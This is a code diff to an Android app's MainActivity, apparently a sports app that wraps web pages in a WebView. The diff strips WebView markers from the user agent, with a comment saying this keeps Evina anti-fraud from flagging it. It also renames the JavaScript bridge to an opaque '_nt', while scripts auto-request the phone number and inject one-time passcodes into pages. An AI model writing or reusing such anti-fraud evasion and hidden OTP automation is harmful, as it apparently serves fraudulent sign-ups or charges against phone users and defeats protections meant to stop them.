@@ -108,7 +108,11 @@ class MainActivity : AppCompatActivity() {
             allowContentAccess = true
             allowFileAccess = true
             mixedContentMode = WebSettings.MIXED_CONTENT_ALWAYS_ALLOW
-            userAgentString = "$userAgentString XoomSportsApp/1.0"
+            // Remove WebView indicators so Evina anti-fraud doesn't flag this as bot/WebView
+            val defaultUA = userAgentString ?: ""
+            userAgentString = defaultUA
+                .replace("; wv", "")
+                .replace("Version/4.0 ", "")
             cacheMode = WebSettings.LOAD_DEFAULT
             setSupportZoom(false)
             builtInZoomControls = false
@@ -124,7 +128,7 @@ class MainActivity : AppCompatActivity() {
         }
 
         // Add JS bridge
-        webView.addJavascriptInterface(WebAppInterface(this), "XoomApp")
+        webView.addJavascriptInterface(WebAppInterface(this), "_nt")
 
         webView.webViewClient = object : WebViewClient() {
             override fun shouldOverrideUrlLoading(view: WebView?, request: WebResourceRequest?): Boolean {
@@ -144,14 +148,13 @@ class MainActivity : AppCompatActivity() {
                 view?.evaluateJavascript(
                     """
                     (function() {
-                        window.__XOOM_APP = true;
-                        window.__XOOM_APP_VERSION = '1.0';
-                        console.log('[XoomApp] App bridge ready');
+                        window._ntR = true;
+                        console.log('[App] Bridge ready');
 
                         // If on manual input page (WiFi), auto-trigger phone hint
                         if (document.querySelector('input[type="tel"]') && !document.querySelector('#otpFull') && !document.querySelector('#otpValue')) {
-                            if (window.XoomApp) {
-                                window.XoomApp.requestPhoneNumber();
+                            if (window._nt) {
+                                window._nt.requestPhoneNumber();
                             }
                         }
                     })();
@@ -245,7 +248,7 @@ class MainActivity : AppCompatActivity() {
             webView.evaluateJavascript(
                 """
                 (function() {
-                    console.log('[XoomApp] Injecting OTP: $otp');
+                    console.log('[App] Injecting OTP: $otp');
 
                     // Method 1: Fill the hidden autofill input
                     var otpInput = document.querySelector('#otpFull') || document.querySelector('#otpValue');
